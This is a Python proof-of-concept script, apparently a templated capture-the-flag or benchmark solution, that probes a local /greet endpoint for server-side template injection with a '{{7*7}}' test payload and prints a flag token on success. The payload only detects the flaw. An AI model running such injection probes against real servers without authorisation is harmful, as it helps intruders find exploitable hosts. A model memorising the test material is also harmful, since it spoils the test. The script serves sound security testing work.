import argparse
import sys
import requests

SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
FLAG_TOKEN = '__FLAG_TOKEN__'
DEFAULT_PAYLOAD = 'SSTI_OK {{7*7}}'

def exploit(base_url: str, payload: str) -> bool:
    url = base_url.rstrip('/') + '/greet'
    try:
        resp = requests.get(url, params={'name': payload}, timeout=5)
    except requests.RequestException as exc:
        print(f'[template-injection-compiler] request failed: {exc}', file=sys.stderr)
        return False
    body = resp.text or ''
    return resp.status_code == 200 and '49' in body and 'SSTI_OK' in body

def main() -> None:
    parser = argparse.ArgumentParser(description='Template Injection compiler PoC')
    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)
    args = parser.parse_args()
    if exploit(args.base_url, args.payload):
        print(SUCCESS_SIGNATURE)
        print(FLAG_TOKEN)
        raise SystemExit(0)
    print('[template-injection-compiler] exploit did not succeed', file=sys.stderr)
    raise SystemExit(1)

if __name__ == '__main__':
    main()
